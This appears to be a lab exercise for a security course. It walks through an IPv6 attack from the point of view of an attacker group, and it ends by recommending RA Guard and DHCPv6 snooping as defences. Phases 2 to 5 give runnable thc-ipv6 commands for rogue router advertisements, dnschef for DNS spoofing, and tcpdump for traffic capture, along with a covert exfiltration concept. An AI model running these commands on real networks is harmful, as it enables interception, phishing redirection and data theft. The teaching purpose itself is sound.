# The IPv6 Shadow Takeover

Objective: Act as an APT actor (`APT-66`, "Shadow6") to exploit the pervasive but often overlooked IPv6 attack surface. You will use rogue router advertisements to hijack traffic, spoof DNS, and establish a persistent foothold, all while evading traditional IPv4-focused security measures.

Scenario: The OpenHands International network is dual-stack (has IPv4 and IPv6 enabled). However, their network monitoring and security policies are primarily focused on IPv4. Your goal is to exploit IPv6 auto-configuration to redirect and intercept victim traffic.

## Phase 1: Reconnaissance - Discovering the Dual-Stack Network

Goal: Confirm IPv6 is enabled on the network and map the IPv6 addressing scheme.

Instructions:

1.  Access Your Foothold:
    *   You have physical access to the OpenHands office network. Start on your attacker VM.
    *   Command: `ssh volunteer@<attacker_vm_ip>`
    *   Password: `[Provided by Lab Instructor]`

2.  Check for IPv6 Connectivity:
    *   Determine your own IPv6 address and default gateway. The presence of a `scope global` address indicates IPv6 is active.
    *   Command: `ip -6 addr show` and `ip -6 route show default`
    *   Finding: What is your IPv6 Global Address? (It will start with `2xxx:` or `fdxx:`).
    *   Your IPv6 Address: `[DISCOVER THIS]`
    *   IPv6 Default Gateway: `[DISCOVER THIS]` - Note it as `LEGITIMATE_RA`.

3.  Discover Other IPv6 Hosts:
    *   Identify the local IPv6 subnet prefix (the first 64 bits of your address). Use the `alive6` tool from the `thc-ipv6` toolkit to find other hosts.
    *   Command: `alive6 eth0`
    *   Finding: This will list IPv6 addresses of other hosts on the local link. Note one as `VICTIM_IPV6`.

4.  Identify the Legitimate Router:
    *   Use `dump_router6` to listen for Router Advertisement (RA) messages from the legitimate gateway.
    *   Command: `dump_router6 eth0`
    *   Finding: Note the source IPv6 address of the legitimate router. It should match your `LEGITIMATE_RA`.

Checkpoint: You have confirmed IPv6 is active and have identified key targets: the legitimate router and a victim host.

## Phase 2: Attack - Rogue Router Advertisement (MITM)

Goal: Become a malicious IPv6 router on the network to trick hosts into sending you their traffic.

Instructions:

1.  Enable IPv6 Forwarding:
    *   Configure your attacker machine to forward IPv6 packets, just like in the IPv4 MITM attack.
    *   Command: `sudo sysctl -w net.ipv6.conf.all.forwarding=1`

2.  Launch a Rogue Router Advertisement:
    *   Use `fake_router6` to impersonate a legitimate router. This will tell hosts on the network to use your machine as their default gateway for IPv6.
    *   Command:
        ```bash
        sudo fake_router6 eth0 <ipv6_prefix>/64
        ```
        *Replace `<ipv6_prefix>` with the first 64 bits of the network prefix you discovered in Phase 1 (e.g., `2001:db8:abcd:1234`).*

3.  Verify the attack is working:
    *   On a victim machine (ask your instructor for access), check its IPv6 routing table after your attack runs for a moment.
    *   Command on Victim (simulated): `ip -6 route show default`
    *   Finding: The victim should now have *two* default routes: one to the legitimate router and one to your attacker machine. IPv6 will often prefer the most recently received RA.
    *   Victim's New Default Route: `default via [YOUR_IPV6_LINK_LOCAL] dev eth0 ...`

Checkpoint: You have successfully poisoned the victim's IPv6 routing table. A portion of their IPv6 traffic is now being sent to your machine.

## Phase 3: DNS Hijacking via RDNSS

Goal: Use the rogue RA messages to also poison the victim's DNS settings, redirecting them to a malicious server you control.

Instructions:

1.  Set Up a Malicious DNS Server:
    *   On your attacker machine, configure a simple DNS server that logs all queries and returns spoofed answers. We'll use `dnschef`.
    *   Command: `sudo dnschef --ipv6 --fakeipv6=<your_ipv6_address> --interface=::0 --port=53`

2.  Advertise Your Rogue DNS Server:
    *   Modify your rogue RA attack to include the Recursive DNS Server (RDNSS) option, pointing to your attacker machine.
    *   Command: Use a more advanced tool like `thc-ipv6`'s `fake_dns6d` or `fake_router26` which combines RA and RDNSS spoofing.
    *   Example:
        ```bash
        # This command advertises yourself as a router AND the DNS server
        sudo fake_router26 eth0 <ipv6_prefix>/64 <your_ipv6_address>
        ```

3.  Trigger and Verify DNS Redirection:
    *   On the victim machine, try to resolve a domain name.
    *   Command on Victim (simulated): `nslookup www.openhands-internal.org`
    *   Finding: The `nslookup` should show that the DNS query was answered by *your* IPv6 address. The result IP should also be your attacker IP.
    *   DNS Server Used by Victim: `[YOUR_IPV6_ADDRESS]`

Checkpoint: You now control the victim's IPv6 default gateway *and* their DNS resolver. You can intercept and manipulate their traffic and direct them to phishing sites.

## Phase 4: Exploiting Privacy Extensions for Persistence

Goal: IPv6 Privacy Extensions (RFC 4941) generate temporary addresses. We will exploit this to maintain access even if the victim's primary address changes.

Instructions:

1.  Scan for Temporary Addresses:
    *   The victim host will have multiple IPv6 addresses: a stable one and temporary ones for outbound connections.
    *   Use `passive_discovery6` to silently monitor traffic and map all of the victim's addresses to its MAC address.
    *   Command: `sudo passive_discovery6 eth0`

2.  Target the Stable Address:
    *   For persistence, focus on the victim's stable, link-local address (derived from its MAC address) or its static address. This address is less likely to change.
    *   Finding: What is the victim's stable link-local address? (It will start with `fe80::` and be based on its MAC).
    *   Victim's Stable LL Address: `[DISCOVER THIS]`

3.  Maintain Rogue Advertisements:
    *   Your `fake_router6` attack is continuous. As long as it runs, any new IPv6 address the victim generates will receive your malicious RA and will use your machine as its gateway. This ensures persistence even as temporary addresses rotate.

Checkpoint: You have a persistent MitM position against the victim host, regardless of its changing IPv6 addresses.

## Phase 5: The Stealthy Exfiltration

Goal: Use your position to intercept specific traffic or create a covert channel.

Instructions:

1.  Intercept Plaintext Traffic:
    *   Just like in IPv4, use `tcpdump` to capture traffic flowing through your machine.
    *   Command: `sudo tcpdump -i eth0 -w ipv6_capture.pcap ip6 host <VICTIM_IPV6> and not port 53`
    *   *We filter out DNS port 53 because we are already logging those queries separately with `dnschef`.*

2.  Create a IPv6 Covert Channel (Optional Bonus):
    *   The large address space of IPv6 can be abused for data exfiltration. Tools like `6exfil` can encode data within the IPv6 address fields of seemingly legitimate packets.
    *   Concept: Instead of sending a normal packet to `2001:db8::1`, you send one to `2001:db8::<encoded_data>`. This is highly stealthy.

Final Report: Document all the `[DISCOVER THIS]` fields. Explain why IPv6 presents a significant blind spot for many organisations. Propose two key mitigations:
1.  RA Guard: Implement Router Advertisement Guard on network switches to drop malicious RAs from unauthorized ports.
2.  DHCPv6 Snooping: Use DHCPv6 Snooping to prevent rogue DHCPv6 servers and enforce legitimate IPv6 configuration.